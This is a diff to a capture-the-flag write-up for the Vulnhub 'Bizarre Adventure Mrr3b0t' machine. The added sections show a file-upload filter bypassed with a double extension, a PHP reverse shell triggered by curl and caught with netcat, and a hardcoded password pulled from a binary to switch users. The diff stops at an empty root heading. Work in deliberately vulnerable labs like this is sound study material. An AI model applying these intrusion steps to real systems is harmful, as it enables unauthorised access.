@@ -3,7 +3,7 @@ title: Vulnhub - Bizarre Adventure Mrr3b0t
 description: My writeup on Bizarre Adventure Mrr3b0t box.
 categories:
  - vulnhub
-tags: vulnhub hydra stego
+tags: vulnhub hydra stego reverse lxd
 ---
 
 ![](https://images-na.ssl-images-amazon.com/images/I/71Z2amvT-tL._AC_SL1062_.jpg)
@@ -89,6 +89,8 @@ b1,r,lsb,xy         .. file: old packed data
 b1,rgb,lsb,xy       .. text: "Did you find the message? Take the Mrrobot user and break your password, just don't think too much!"
 ```
 
+## Shell as www-data
+
 We have a user! `mrrobot` let's fire up hydra! :fire:
 
 ```
@@ -103,4 +105,54 @@ We're in as `mrrobot:secret` & we can see an upload form:
 
 ![](https://i.imgur.com/Lw6pd9i.png)
 
+If we try to upload a `.php` file we get an error message:
 
+![](https://i.imgur.com/xCGkICy.png)
+
+We can simply bypass that by upload a file like this `shell.jpg.php`, let's upload a php reverse shell and execute it.
+
+```
+$ curl http://$ip/administrator/shell.jpg.php
+```
+
+```
+$ nc -lvp 5555              
+listening on [any] 5555 ...
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@mrr3b0t:/$ whoami;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## Shell as exploiter
+
+Here i stuck for a while, was tricky!! Under `/var/www` we can see a `bf` directory, this directory has a 64bit ELF file in:
+
+```
+www-data@mrr3b0t:/var/www/bf$ file buffer
+buffer: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d870ae3a0c4c68f57dede236b914138be4074732, not stripped
+```
+
+Let's do some basic reverse engineering, if we run `strings` we can see the password for user `exploiter`:
+
+```
+www-data@mrr3b0t:/var/www/bf$ strings buffer
+...data..
+ Digite a senha: 
+MrR0b0t121
+ Senha errada 
+ Senha Correta 
+Password@123
+```
+
+```
+www-data@mrr3b0t:/var/www/bf$ su - exploiter
+Password: Password@123
+
+exploiter@mrr3b0t:~$ whoami;id 
+exploiter
+uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip),46(plugdev),111(lxd),118(lpadmin),119(sambashare)
+```
+
+## Shell as root
